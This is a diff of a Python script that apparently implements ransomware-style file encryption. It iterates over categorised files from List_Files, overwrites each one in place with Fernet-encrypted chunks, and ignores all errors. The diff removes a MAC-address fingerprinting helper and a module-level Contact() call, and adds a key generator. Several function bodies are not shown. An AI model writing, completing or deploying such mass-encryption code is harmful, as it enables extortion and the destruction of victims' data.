@@ -2,28 +2,16 @@ import os
 import mmap
 import shutil
 import psutil
-import yaml # type: ignore
+import yaml
 from pathlib import Path
 from cryptography.fernet import Fernet
 
 
-def GetMac() -> str:
-    try:
-        # Tạo danh sách các địa chỉ MAC từ giao diện mạng
-        address_mac = [
-            address.address 
-            for addresses in psutil.net_if_addrs().values() 
-            for address in addresses 
-            if address.family == psutil.AF_LINK
-        ]
-        # Trả về hai địa chỉ MAC đầu tiên được ngăn cách bởi dấu "|"
-        return '|'.join(address_mac[1:3]) if len(address_mac) >= 3 else 'No-Mac'
-    except:
-        # Trả về 'No-Mac' nếu có lỗi xảy ra
-        return 'No-Mac'
+def generate_key():
+    return Fernet.generate_key()
 
 
-def process_files(Private: Fernet, mode: str):
+def Process_Files(Private: Fernet, mode: str):
     for _, files in List_Files().items():
         for file in files:
             temp_file = file + '.temp'
@@ -38,19 +26,19 @@ def process_files(Private: Fernet, mode: str):
                             processed_chunk = Private.encrypt(chunk) if mode == 'encrypt' else Private.decrypt(chunk)
                             temp_file.write(processed_chunk)
                             offset += len(chunk)
-                shutil.move(temp_file, file)
+                shutil.move(temp_file.name, file)
             except Exception as e: pass
             finally:
-                if os.path.exists(temp_file):
-                    os.remove(temp_file)
+                if os.path.exists(temp_file.name):
+                    os.remove(temp_file.name)
 
 
 def Encrypt(Private: Fernet):
-    process_files(Private, 'encrypt')
+    Process_Files(Private, 'encrypt')
 
 
 def Decrypt(Private: Fernet):
-    process_files(Private, 'decrypt')
+    Process_Files(Private, 'decrypt')
 
 
 def Contact():
@@ -83,4 +71,5 @@ def List_Files() -> dict:
 
     return file_categories
 
-Contact()
+
+
